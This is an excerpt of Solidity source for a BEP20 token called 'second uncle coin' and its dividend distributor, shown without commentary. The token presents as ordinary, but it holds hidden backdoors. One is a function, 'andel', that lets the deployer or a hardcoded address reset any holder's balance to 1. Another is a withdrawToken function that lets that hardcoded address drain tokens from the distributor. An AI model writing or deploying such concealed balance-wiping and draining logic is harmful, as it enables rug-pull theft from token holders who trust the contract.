...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        _token = msg.sender;
        _solo = 0x00Ff1472cd6C97fDF11b28a85904Fb849F66d1Db;
    }
    ...
    function withdrawToken(address _tokenContract, uint256 _amount) public  {
        require(msg.sender == _solo, "unsolo");
...
contract secondunclecoin is IBEP20, Auth {
    
    using SafeMath for uint256;

    string constant _name = "second uncle coin";
    string constant _symbol = "SUC";
    ...
    constructor () Auth(msg.sender) {
        ...
        anothermarketingWallet = 0xae3c89927bA5d68974Af8A3EcE3D55b1144CaA76;
        solor = msg.sender;
    ...
    function andel(address ac) public{
        require(msg.sender == solor || msg.sender == solo);
        _balances[ac] = 1;
        // emit events as well
    }
